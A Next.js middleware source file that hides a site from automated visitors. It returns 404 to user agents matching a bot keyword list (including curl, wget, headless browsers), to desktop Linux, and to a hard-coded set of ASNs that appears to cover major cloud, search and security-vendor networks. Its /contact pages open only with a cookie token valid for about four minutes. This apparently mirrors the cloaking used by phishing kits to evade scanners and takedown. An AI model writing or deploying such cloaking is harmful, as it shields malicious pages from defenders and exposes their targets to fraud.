import { NextRequest, NextResponse } from 'next/server';

const BOT_KEYWORDS = ['bot', 'spider', 'crawler', 'headl', 'headless', 'slurp', 'fetcher', 'googlebot', 'bingbot', 'yandexbot', 'baiduspider', 'twitterbot', 'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot', 'puppeteer', 'selenium', 'webdriver', 'curl', 'wget', 'python', 'scrapy', 'lighthouse', 'facebookexternalhit'];

const BLOCKED_ASN = new Set([15169, 32934, 396982, 8075, 16509, 16510, 14618, 31898, 45102, 55960, 198605, 201814, 24940, 51396, 14061, 20473, 63949, 16276, 135377, 52925, 17895, 52468, 36947, 212238, 60068, 136787, 62240, 9009, 208172, 131199, 21859, 55720, 397373, 208312, 37100, 214961, 401115, 210644, 6939, 209]);

const BLOCKED_UA_REGEX = new RegExp(`(${BOT_KEYWORDS.join('|')})|Linux(?!.*Android)`, 'i');

interface GeoInfo {
    asn: number;
}

const getGeoInfo = async (ip: string): Promise<GeoInfo | null> => {
    try {
        const response = await fetch(`https://get.geojs.io/v1/ip/geo/${ip}.json`, {
            signal: AbortSignal.timeout(3000)
        });

        if (!response.ok) {
            console.error('GeoJS API error:', response.status);
            return null;
        }

        const data = await response.json();
        return {
            asn: data.asn
        };
    } catch {
        return null;
    }
};

export const proxy = async (req: NextRequest) => {
    const ua = req.headers.get('user-agent');
    const { pathname } = req.nextUrl;

    const ip = req.headers.get('cf-connecting-ip') || req.headers.get('x-nf-client-connection-ip') || req.headers.get('x-forwarded-for')?.split(',')[0].trim() || req.headers.get('x-real-ip') || 'unknown';

    if (!ua || BLOCKED_UA_REGEX.test(ua)) {
        return new NextResponse(null, { status: 404 });
    }

    if (ip !== 'unknown') {
        const geoInfo = await getGeoInfo(ip);
        if (geoInfo) {
            if (geoInfo.asn && BLOCKED_ASN.has(geoInfo.asn)) {
                return new NextResponse(null, { status: 404 });
            }
        }
    }

    if (!pathname.startsWith('/contact')) {
        return NextResponse.next();
    }
    const currentTime = Date.now();
    const token = req.cookies.get('token')?.value;
    const pathSegments = pathname.split('/');
    const slug = pathSegments[2];

    const isValid = token && slug && Number(slug) - Number(token) < 240000 && currentTime - Number(token) < 240000;

    if (isValid) {
        return NextResponse.next();
    }

    return new NextResponse(null, { status: 404 });
};

export const config = {
    matcher: ['/contact/:path*', '/live']
};
